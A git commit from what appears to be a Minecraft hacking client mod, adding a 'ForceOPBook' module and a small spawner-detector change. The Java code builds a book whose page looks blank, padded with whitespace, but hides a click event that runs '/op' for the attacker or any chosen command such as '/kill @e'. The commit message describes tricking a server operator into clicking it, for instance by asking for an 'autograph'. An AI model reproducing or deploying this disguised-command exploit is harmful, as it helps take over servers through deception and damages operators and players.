1da04b921b2ef82e5f9b4612b3facdf4bac4bbdd
etianl <115842502+etianl@users.noreply.github.com>
2024-12-16 01:06:46 -0800

    v1.3.3 ForceOPBook added, ActivatedSpawnerDetecter change
    **v1.3.3** 
    **ActivatedSpawnerDetector update:**
    - Added an option enabled by default that will reduce spam about checking storage around the spawners. If there is no chests within 14 blocks of the spawner (the distance to trigger it) then it will not tell you to check storage.
    
    **ForceOPBook Module added!**
    - Creates a blank book and quill where the first page is a click event that you can load with any command. The book looks completely blank and is not very suspicious so just ask the target operator for an autograph. The book menu will not let them write, it will close and the command will have executed.
    - The book can only execute commands that are available to the victim, so targeting an operator is necessary
    - If you want to you can choose the text in the book and the author/title.
    - In server versions less than Minecraft version 1.21.2 you cannot put clickEvents on a book and quill so in those versions you have to use the WrittenBook mode which creates a written book item that has been signed. Those books would require more social engineering to use, you'd have to convince the operator to click on the first page.

---
+++ src/main/java/pwn/noobs/trouserstreak/modules/ForceOPBook.java
@@ -0,0 +1,96 @@
+package pwn.noobs.trouserstreak.modules;
+
+import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.systems.modules.Module;
+import net.minecraft.component.ComponentChanges;
+import net.minecraft.component.DataComponentTypes;
+import net.minecraft.component.type.WrittenBookContentComponent;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.Items;
+import net.minecraft.text.ClickEvent;
+import net.minecraft.text.MutableText;
+import net.minecraft.text.RawFilteredPair;
+import net.minecraft.text.Text;
+import pwn.noobs.trouserstreak.Trouser;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class ForceOPBook extends Module {
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
+            .name("Command Mode")
+            .description("the mode")
+            .defaultValue(Modes.ForceOP)
+            .build());
+    private final Setting<String> theCommand = sgGeneral.add(new StringSetting.Builder()
+            .name("Command")
+            .description("What command is run")
+            .defaultValue("/kill @e")
+            .visible(() -> mode.get() == Modes.AnyCommand)
+            .build()
+    );
+    private final Setting<String> title = sgGeneral.add(new StringSetting.Builder()
+            .name("Book Title")
+            .description("The book's name")
+            .defaultValue("Legal Document")
+            .build()
+    );
+    private final Setting<String> author = sgGeneral.add(new StringSetting.Builder()
+            .name("Book Author")
+            .description("The book's author")
+            .defaultValue("Satan")
+            .build()
+    );
+    private final Setting<String> text = sgGeneral.add(new StringSetting.Builder()
+            .name("Text")
+            .description("What text is on the book's page")
+            .defaultValue("§4Sign here to hand over your eternal soul ____________")
+            .build()
+    );
+
+    public ForceOPBook() {
+        super(Trouser.Main, "ForceOPBook", "Requires Creative mode! Creates a Book that can run commands in your inventory. Give it to someone with OP and have them click on the page in the book.");
+    }
+
+    @Override
+    public void onActivate() {
+        if (!mc.player.getAbilities().creativeMode) {
+            error("You need creative mode to make the book.");
+            toggle();
+            return;
+        }
+        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
+        RawFilteredPair<String> Title = RawFilteredPair.of(title.get());
+        List<RawFilteredPair<Text>> pages = new ArrayList<>();
+        if (mode.get() == Modes.ForceOP){
+            MutableText pageText = Text.literal(text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ")
+                    .styled(style -> style.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/op "+mc.player.getName().getLiteralString())));
+            pages.add(RawFilteredPair.of(pageText));
+        } else {
+            MutableText pageText = Text.literal(text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ")
+                    .styled(style -> style.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, theCommand.get())));
+            pages.add(RawFilteredPair.of(pageText));
+        }
+        WrittenBookContentComponent bookContentComponent = new WrittenBookContentComponent(
+                Title, author.get(), 0, pages, true
+        );
+
+        var changes = ComponentChanges.builder()
+                .add(DataComponentTypes.WRITTEN_BOOK_CONTENT, bookContentComponent)
+                .build();
+
+        stack.applyChanges(changes);
+
+        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);
+        info("Book created.");
+
+        toggle();
+    }
+    public enum Modes {
+        ForceOP, AnyCommand
+    }
+    public enum bookModes {
+        WritableBook, WrittenBook
+    }
+}
